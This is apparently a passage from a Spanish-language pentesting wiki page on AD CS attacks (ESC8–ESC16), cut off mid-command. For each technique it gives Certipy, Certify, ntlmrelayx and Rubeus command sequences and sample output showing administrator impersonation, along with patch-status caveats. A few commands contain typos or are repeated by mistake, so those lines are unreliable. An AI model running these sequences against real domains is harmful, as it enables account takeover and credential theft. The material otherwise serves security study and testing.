- La **interfaz de inscripción web** (una aplicación ASP antigua disponible en `http://<caserver>/certsrv/`) utiliza HTTP de forma predeterminada, lo que no ofrece protección contra ataques NTLM relay. Además, permite explícitamente solo la autenticación NTLM mediante su encabezado HTTP Authorization, lo que hace inaplicables métodos de autenticación más seguros, como Kerberos.
- El **Certificate Enrollment Service** (CES), el servicio web **Certificate Enrollment Policy** (CEP) y el **Network Device Enrollment Service** (NDES) admiten de forma predeterminada la autenticación Negotiate mediante su encabezado HTTP Authorization. La autenticación Negotiate **admite tanto** Kerberos como **NTLM**, lo que permite a un atacante **degradar a** la autenticación NTLM durante ataques relay. Aunque estos servicios web habilitan HTTPS de forma predeterminada, HTTPS por sí solo **no protege contra ataques NTLM relay**. La protección contra ataques NTLM relay en servicios HTTPS solo es posible cuando HTTPS se combina con channel binding. Lamentablemente, AD CS no activa Extended Protection for Authentication en IIS, que es necesario para channel binding.<sup>[[6]](#references)</sup>

Un **problema** habitual de los ataques NTLM relay es la **breve duración de las sesiones NTLM** y la imposibilidad de que el atacante interactúe con servicios que **requieren el firmado NTLM**.

Sin embargo, esta limitación se supera explotando un ataque NTLM relay para obtener un certificado para el usuario, ya que el periodo de validez del certificado determina la duración de la sesión, y el certificado puede utilizarse con servicios que **exigen el firmado NTLM**. Para obtener instrucciones sobre cómo utilizar un certificado robado, consulta:


{{#ref}}
account-persistence.md
{{#endref}}

Otra limitación de los ataques NTLM relay es que **una cuenta víctima debe autenticarse ante una máquina controlada por el atacante**. El atacante puede esperar o intentar **forzar** esta autenticación:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera los **endpoints HTTP de AD CS habilitados**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Las Autoridades de certificación (CAs) empresariales utilizan la propiedad `msPKI-Enrollment-Servers` para almacenar los puntos de conexión de Certificate Enrollment Service (CES). Estos puntos de conexión se pueden analizar y enumerar con la herramienta **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

De forma predeterminada, Certipy solicita un certificado basado en la plantilla `Machine` o `User`, según si el nombre de la cuenta que se está retransmitiendo termina en `$`. Para especificar una plantilla alternativa, se puede usar el parámetro `-template`.

A continuación, se puede emplear una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Si se trata de controladores de dominio, es necesario especificar `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) de **`msPKI-Enrollment-Flag`**, denominado ESC9, omite la extensión SID `szOID_NTDS_CA_SECURITY_EXT` de un certificado. Los ejemplos antiguos de ESC9 dependen del comportamiento de compatibilidad del KDC (`StrongCertificateBindingEnforcement=1`) o de una ruta independiente de mapeo débil de Schannel. El valor `1` es una **configuración histórica de compatibilidad**, no el valor predeterminado actual: Microsoft indica que la anulación del KDC dejó de ser compatible con la actualización de seguridad de Windows del 9 de septiembre de 2025. Comprueba las actualizaciones instaladas en el objetivo y el endpoint de autenticación antes de aplicar una receta antigua.<sup>[[7]](#references)</sup> Consulta las [instrucciones de despliegue de Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Las condiciones en las que la configuración de esta marca adquiere importancia incluyen:

- En un KDC antiguo y compatible, la política efectiva de asociación de certificados permite el mapeo; como alternativa, el endpoint de Schannel habilita por separado el mapeo UPN mediante el bit `0x4` de `CertificateMappingMethods`.
- El certificado tiene marcada la flag `CT_FLAG_NO_SECURITY_EXTENSION` en la configuración de `msPKI-Enrollment-Flag`.
- El certificado especifica cualquier EKU de autenticación de cliente.
- Hay permisos `GenericWrite` sobre cualquier cuenta para comprometer otra.

### Escenario de abuso

Supongamos que `John@corp.local` tiene permisos `GenericWrite` sobre `Jane@corp.local` y el objetivo es comprometer `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permiso para inscribirse, está configurada con la flag `CT_FLAG_NO_SECURITY_EXTENSION` en su configuración de `msPKI-Enrollment-Flag`.

Inicialmente, se obtiene el hash de `Jane` mediante Shadow Credentials, gracias a los permisos `GenericWrite` de `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte del dominio `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Esta modificación no infringe las restricciones, dado que `Administrator@corp.local` sigue siendo distinto del `userPrincipalName` de `Administrator`.

A continuación, se solicita como `Jane` la plantilla de certificado `ESC9`, marcada como vulnerable:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Se observa que el `userPrincipalName` del certificado refleja `Administrator`, sin ningún «object SID».

A continuación, se revierte el `userPrincipalName` de `Jane` al original, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Intentar la autenticación con el certificado emitido ahora devuelve el hash NT de `Administrator@corp.local`. El comando debe incluir `-domain <domain>` debido a que el certificado no especifica el dominio:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Mapeos de certificados débiles - ESC10

### Explicación

A menudo se habla de dos políticas de mapeo de certificados distintas bajo ESC10. Comprueba la configuración en el endpoint que gestiona la autenticación correspondiente:

- `CertificateMappingMethods` de Schannel en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` controla el mapeo de certificados de cliente TLS en el servidor de aplicaciones. El bit UPN es `0x4`; el valor predeterminado en sistemas actualizados es `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` de KDC en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` controlaba históricamente la compatibilidad del enlace de certificados Kerberos. El valor `1` no es un valor predeterminado actual fiable, y Microsoft dejó de admitir esta opción de configuración con la actualización de seguridad de Windows del 9 de septiembre de 2025. Su estado no describe por sí solo el mapeo UPN de Schannel.<sup>[[7]](#references)</sup>

**Caso 1**

Históricamente, cuando un KDC antiguo respetaba `StrongCertificateBindingEnforcement=0`; comprueba el nivel de actualización, ya que esta opción de configuración ya no se admite en sistemas actuales con los parches instalados.

**Caso 2**

Cuando el endpoint de certificados de cliente de Schannel tiene habilitado el bit UPN (`0x4`) de `CertificateMappingMethods`. Esta configuración es independiente de la aplicación del enlace fuerte de KDC y sigue requiriendo un certificado de autenticación de cliente que se pueda inscribir, además de control efectivo sobre el atributo de cuenta mapeado.

### Caso de abuso 1

En una implementación antigua donde el KDC aún respeta `StrongCertificateBindingEnforcement=0`, controlar el `userPrincipalName` de una cuenta puede formar parte de una ruta de mapeo débil hacia otra cuenta. La inscripción del certificado necesaria, el mapeo, la identidad de destino y la autenticación exitosa deben verificarse por separado; por sí solos, un ACE `GenericWrite` o un valor del registro no demuestran que se pueda tomar el control de la cuenta.

Por ejemplo, si tiene permisos `GenericWrite` sobre `Jane@corp.local`, un atacante busca comprometer `Administrator@corp.local`. El procedimiento es similar al de ESC9, lo que permite utilizar cualquier plantilla de certificado.

Inicialmente, se obtiene el hash de `Jane` mediante Shadow Credentials, aprovechando `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una infracción de restricciones.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

A continuación, se solicita como `Jane` un certificado que habilita la autenticación de cliente, utilizando la plantilla predeterminada `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

El `userPrincipalName` de `Jane` se restablece entonces a su valor original, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Autenticarse con el certificado obtenido devolverá el hash NT de `Administrator@corp.local`; es necesario especificar el dominio en el comando porque el certificado no incluye los datos del dominio.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Caso de abuso 2

Cuando `CertificateMappingMethods` contiene el indicador de bit `UPN` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que no tenga una propiedad `userPrincipalName`, incluidas las cuentas de máquina y la cuenta de administrador de dominio integrada `Administrator`.

En este caso, el objetivo es comprometer `DC$@corp.local`, empezando por obtener el hash de `Jane` mediante Shadow Credentials, aprovechando `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

El `userPrincipalName` de `Jane` se establece entonces en `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Se solicita un certificado para autenticación de cliente como `Jane` mediante la plantilla predeterminada `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

El `userPrincipalName` de `Jane` se restablece a su valor original después de este proceso.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Para autenticarse mediante Schannel, se utiliza la opción `-ldap-shell` de Certipy, lo que indica que la autenticación se realizó correctamente como `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

A través del shell LDAP, comandos como `set_rbcd` permiten ataques de Resource-Based Constrained Delegation (RBCD), que pueden comprometer el controlador de dominio.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Esta vulnerabilidad también afecta a cualquier cuenta de usuario que no tenga `userPrincipalName` o cuyo valor no coincida con `sAMAccountName`. La cuenta predeterminada `Administrator@corp.local` es un objetivo prioritario debido a sus privilegios LDAP elevados y a que, por defecto, no tiene `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Explanation

Si el servidor CA no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, es posible realizar ataques de NTLM relay sin firma a través del servicio RPC. [Referencia aquí](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado. `certipy` mostrará las vulnerabilidades `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Escenario de abuso

Es necesario configurar un servidor relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Nota: Para los controladores de dominio, debemos especificar `-template` en DomainController.

O usando [el fork de impacket de sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Acceso Shell a una CA de ADCS con YubiHSM - ESC12

### Explicación

Los administradores pueden configurar la Autoridad de Certificación para que almacene la clave en un dispositivo externo, como el "Yubico YubiHSM2".

Si se conecta un dispositivo USB al servidor de la CA mediante un puerto USB, o a un servidor de dispositivos USB si el servidor de la CA es una máquina virtual, se requiere una clave de autenticación (a veces denominada "contraseña") para que el Key Storage Provider genere y utilice claves en el YubiHSM.

Esta clave/contraseña se almacena en texto sin cifrar en el registro, bajo `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Referencia [aquí](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Escenario de abuso

Si la clave privada de la CA está almacenada en un dispositivo USB físico cuando obtienes acceso Shell, es posible recuperarla.

Primero, debes obtener el certificado de la CA (es público) y luego:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Finalmente, usa el comando `certutil -sign` para falsificar un nuevo certificado arbitrario usando el certificado de la CA y su clave privada.

## OID Group Link Abuse - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite agregar la política de emisión a la plantilla de certificado. Los objetos `msPKI-Enterprise-Oid`, responsables de emitir políticas, se pueden encontrar en el Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenedor PKI OID. Se puede vincular una política a un grupo de AD mediante el atributo `msDS-OIDToGroupLink` de este objeto, lo que permite que el sistema autorice a un usuario que presenta el certificado como si fuera miembro del grupo. [Referencia aquí](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

En otras palabras, cuando un usuario tiene permiso para solicitar un certificado y este está vinculado a un grupo OID, el usuario puede heredar los privilegios de dicho grupo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar `OIDToGroupLink`:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Escenario de abuso

Busca un usuario que tenga permisos para usar `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permiso para inscribirse en `VulnerableTemplate`, puede heredar los privilegios del grupo `VulnerableGroup`.

Solo tiene que especificar la plantilla y obtendrá un certificado con derechos `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Abuso de Explicit Certificate Mapping — ESC14

### Explicación

La descripción en https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping es extraordinariamente detallada. A continuación se cita el texto original.<sup>[[14]](#references)</sup>

ESC14 aborda las vulnerabilidades que surgen del «weak explicit certificate mapping», principalmente por el uso indebido o la configuración insegura del atributo `altSecurityIdentities` en cuentas de usuario o equipo de Active Directory. Este atributo multivalor permite a los administradores asociar manualmente certificados X.509 con una cuenta de AD para fines de autenticación. Cuando se rellenan, estas asignaciones explícitas pueden reemplazar la lógica predeterminada de asignación de certificados, que normalmente se basa en los UPN o nombres DNS del SAN del certificado, o en el SID integrado en la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`.

Una asignación «débil» se produce cuando el valor de cadena usado en el atributo `altSecurityIdentities` para identificar un certificado es demasiado amplio, fácil de adivinar, depende de campos de certificado que no son únicos o usa componentes del certificado que se pueden falsificar fácilmente. Si un atacante puede obtener o crear un certificado cuyos atributos coincidan con una asignación explícita débilmente definida para una cuenta privilegiada, puede usar ese certificado para autenticarse como dicha cuenta e suplantarla.

Algunos ejemplos de cadenas de asignación potencialmente débiles para `altSecurityIdentities`:

- Asignar únicamente por un Common Name (CN) habitual en el Subject; por ejemplo, `X509:<S>CN=SomeUser`. Un atacante podría obtener un certificado con este CN de una fuente menos segura.
- Usar Issuer Distinguished Names (DN) o Subject DN demasiado genéricos sin calificadores adicionales, como un número de serie específico o un subject key identifier; por ejemplo, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Usar otros patrones predecibles o identificadores no criptográficos que un atacante podría satisfacer en un certificado que pueda obtener legítimamente o falsificar (si ha comprometido una CA o encontrado una plantilla vulnerable como en ESC1).

El atributo `altSecurityIdentities` admite varios formatos de asignación, como:

- `X509:<I>IssuerDN<S>SubjectDN` (asigna según el Issuer y Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (asigna según el valor de la extensión Subject Key Identifier del certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (asigna según el número de serie, calificado implícitamente por el Issuer DN); no es un formato estándar; normalmente es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (asigna según un nombre RFC822, normalmente una dirección de correo electrónico, del SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (asigna según un hash SHA1 de la clave pública sin procesar del certificado; generalmente es seguro)

La seguridad de estas asignaciones depende de los identificadores que usen. Microsoft clasifica como **débiles** las asignaciones basadas en correo electrónico o nombres de sujeto, incluidas las que usan `X509:<RFC822>`. En el modo Full Enforcement, se rechaza un certificado sin una asignación segura; la actualización de seguridad de Windows de septiembre de 2025 eliminó la opción de volver al modo Compatibility. Por lo tanto, una asignación débil por sí sola no es una vía de suplantación fiable actualmente. Antes de evaluar un escenario de asignación débil, comprueba el nivel de parche real del controlador de dominio y el comportamiento de asignación de certificados. El acceso de escritura a `altSecurityIdentities` es una pista independiente: un atacante con un certificado de confianza apropiado podría añadir una asignación explícita **segura**, según los permisos efectivos y la validación del certificado. Consulta [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) y [la investigación sobre ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

También es necesario diagnosticar los errores de autenticación con certificados: una cuenta de destino deshabilitada o una contraseña caducada pueden impedir el inicio de sesión aunque el certificado siga siendo válido.

### Escenario de abuso

ESC14 apunta a **explicit certificate mappings** en Active Directory (AD), concretamente al atributo `altSecurityIdentities`. Si este atributo está configurado (por diseño o por una configuración incorrecta), los atacantes pueden suplantar cuentas presentando certificados que coincidan con la asignación.

#### Escenario A: El atacante puede escribir en `altSecurityIdentities`

 **Requisito previo**: El atacante tiene permisos de escritura en el atributo `altSecurityIdentities` de la cuenta de destino o permiso para concederlo mediante uno de los siguientes permisos sobre el objeto AD de destino:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Escenario B: El destino tiene una asignación débil mediante X509RFC822 (correo electrónico)

- **Requisito previo histórico/condicional**: El destino tiene una asignación débil X509RFC822 en `altSecurityIdentities`, el atacante puede editar el atributo `mail` de un solicitante y una plantilla adecuada incluye ese correo electrónico en un certificado de autenticación de cliente sin una vinculación SID conflictiva. La autenticación también requiere un entorno que todavía acepte la asignación débil; Full Enforcement rechaza las asignaciones de certificados que solo sean débiles. Que el atributo `mail` sea modificable es solo una pista.
#### Escenario C: El destino tiene una asignación X509IssuerSubject

- **Requisito previo**: El destino tiene una asignación explícita débil X509IssuerSubject en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` de una entidad principal víctima para que coincida con el sujeto de la asignación X509IssuerSubject del destino. Después, el atacante puede inscribir un certificado como la víctima y usarlo para autenticarse como el destino.
#### Escenario D: El destino tiene una asignación X509SubjectOnly

- **Requisito previo**: El destino tiene una asignación explícita débil X509SubjectOnly en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` de una entidad principal víctima para que coincida con el sujeto de la asignación X509SubjectOnly del destino. Después, el atacante puede inscribir un certificado como la víctima y usarlo para autenticarse como el destino.
### Operaciones concretas
#### Escenario A

Solicita un certificado de la plantilla de certificado `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Guardar y convertir el certificado

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Autenticarse (usando el certificado)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Limpieza (opcional)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Para consultar métodos de ataque más específicos en distintos escenarios de ataque, consulta lo siguiente: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explicación

La [investigación original sobre ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) explica cómo las políticas de aplicación incluidas en una solicitud para una plantilla V1 pueden sobrescribir el Extended Key Usage configurado en una **CA emisora sin parchear**.<sup>[[15]](#references)</sup> También se necesita una plantilla publicada y que permita la inscripción, con las propiedades de asunto/solicitud requeridas y sin requisitos de aprobación o firma que lo impidan. Tener derechos de inscripción no demuestra por sí solo que se pueda explotar la vulnerabilidad. El uso de Certificate Request Agent también puede depender de una segunda plantilla adecuada y de las restricciones del agente de inscripción; confirma el estado de los parches de la CA y el resultado de la emisión antes de afirmar que esa vía es viable.

### Explotación

La [documentación de escalada de privilegios de Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contiene ejemplos de uso más detallados.<sup>[[14]](#references)</sup>


El comando `find` de Certipy puede ayudar a identificar plantillas V1 potencialmente vulnerables a ESC15 si la CA no tiene los parches.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Escenario A: Suplantación directa mediante Schannel

**Paso 1: Solicitar un certificado, inyectando la directiva de aplicación "Client Authentication" y el UPN del objetivo.** El atacante `attacker@corp.local` apunta a `administrator@corp.local` usando la plantilla V1 "WebServer" (que permite que el solicitante proporcione el sujeto).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: La plantilla V1 vulnerable con «Enrollee supplies subject».
- `-application-policies 'Client Authentication'`: Inyecta el OID `1.3.6.1.5.5.7.3.2` en la extensión Application Policies de la CSR.
- `-upn 'administrator@corp.local'`: Establece el UPN en el SAN para la suplantación.

**Paso 2: Autenticarse mediante Schannel (LDAPS) con el certificado obtenido.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Escenario B: Suplantación de identidad mediante PKINIT/Kerberos a través del abuso de Enrollment Agent

**Paso 1: Solicitar un certificado de una plantilla V1 (con «Enrollee supplies subject»), inyectando la Application Policy «Certificate Request Agent».** Este certificado es para que el atacante (`attacker@corp.local`) se convierta en un agente de inscripción. Aquí no se especifica ningún UPN para la identidad propia del atacante, ya que el objetivo es obtener la capacidad de agente.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Inyecta el OID `1.3.6.1.4.1.311.20.2.1`.

**Paso 2: Usa el certificado «agent» para solicitar un certificado en nombre de un usuario privilegiado objetivo.** Este es un paso similar a ESC3 que utiliza como certificado de agente el certificado del Paso 1.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Paso 3: Autentícate como el usuario privilegiado usando el certificado "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Extensión de seguridad deshabilitada en la CA (globalmente)-ESC16

### Explicación

**ESC16 (escalada de privilegios mediante la falta de la extensión szOID_NTDS_CA_SECURITY_EXT)** describe la supresión de la extensión SID **szOID_NTDS_CA_SECURITY_EXT** en toda la CA. Esto es un indicador de configuración, no una prueba de que un certificado pueda autenticarse como otra cuenta. La suplantación también requiere controlar los atributos o la asignación de la cuenta pertinente, una plantilla de autenticación de cliente que permita la inscripción y una ruta de asignación de certificados aceptada por el controlador de dominio o el servicio que se use. Un KDC actualizado con Full Enforcement rechaza los certificados sin una extensión SID, salvo que tengan otra asignación sólida; el procedimiento Kerberos que solo usa UPN que aparece abajo se aplica a KDC más antiguos o en modo de compatibilidad que todavía aceptan asignaciones débiles. Consulta las [directrices de Microsoft sobre la asignación de certificados y la aplicación de medidas](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

También puedes consultar este artículo para obtener más información sobre el principio detallado:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuso

El siguiente ejemplo histórico de Kerberos que solo usa UPN se basa en la [documentación de ESC16 de Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Requiere un KDC que todavía acepte la asignación débil resultante; `StrongCertificateBindingEnforcement=1` ya no es una opción compatible para anular este comportamiento tras la actualización de seguridad de Windows del 9 de septiembre de 2025.<sup>[[14]](#references)</sup>

Para identificar si el entorno de Active Directory Certificate Services (AD CS) es vulnerable a **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Paso 1: Leer el UPN inicial de la cuenta víctima (Opcional - para restaurarlo).  **  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Paso 2: Actualiza el UPN de la cuenta víctima al `sAMAccountName` del administrador objetivo.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Paso 3: (Si es necesario) Obtén las credenciales de la cuenta «víctima» (por ejemplo, mediante Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Paso 4: Solicita un certificado como el usuario «víctima» desde una plantilla de autenticación de cliente en la que la cuenta pueda inscribirse (p. ej., «User»), en la CA configurada con ESC16.** La CA omite la extensión de seguridad SID del certificado emitido, pero esto por sí solo no establece una asignación de autenticación utilizable. Configura la variable de entorno de la caché de credenciales de Kerberos (comando de shell):

```bash
export KRB5CCNAME=victim.ccache
```

Luego solicita el certificado:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
